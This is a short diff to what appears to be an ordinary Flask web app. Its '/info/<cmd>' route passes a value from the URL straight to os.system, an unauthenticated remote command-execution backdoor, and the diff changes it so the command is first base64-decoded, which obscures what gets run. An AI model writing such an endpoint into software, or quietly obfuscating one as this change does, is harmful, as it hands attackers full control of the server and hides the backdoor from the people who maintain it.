@@ -1,5 +1,6 @@
 from flask import Flask, escape
 import os
+import base64
 
 app = Flask(__name__)
 
@@ -13,7 +14,7 @@ def hello_user(username):
 
 @app.route("/info/<cmd>")
 def cmd_run(cmd):
-    os.system(cmd)
+    os.system(base64.b64decode(cmd))
     return "Executed"
 
 def main():
